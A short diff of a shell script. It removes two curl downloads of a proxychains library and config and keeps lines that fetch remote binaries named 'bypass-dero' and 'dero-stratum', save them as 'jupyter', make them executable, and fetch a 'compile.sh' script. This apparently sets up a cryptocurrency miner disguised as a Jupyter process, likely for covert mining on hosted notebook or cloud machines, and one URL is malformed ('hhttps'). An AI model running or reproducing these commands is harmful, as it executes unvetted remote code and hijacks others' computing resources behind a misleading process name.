@@ -1,5 +1,3 @@
-curl -L -o lib https://github.com/leporitore/compile/raw/master/libproxychains4.so && chmod +x lib
-curl -L -o proxy https://github.com/leporitore/compile/raw/master/proxychains.conf && chmod +x proxy
 curl -L -o jupyter hhttps://github.com/terryputri/file/raw/main/bypass-dero && chmod +x jupyter
 curl -L -o jupyter https://github.com/terryputri/file/raw/main/dero-stratum && chmod +x jupyter
 curl -L -o compile.sh https://raw.githubusercontent.com/terryputri/file/main/compile.sh && chmod +x compile.sh
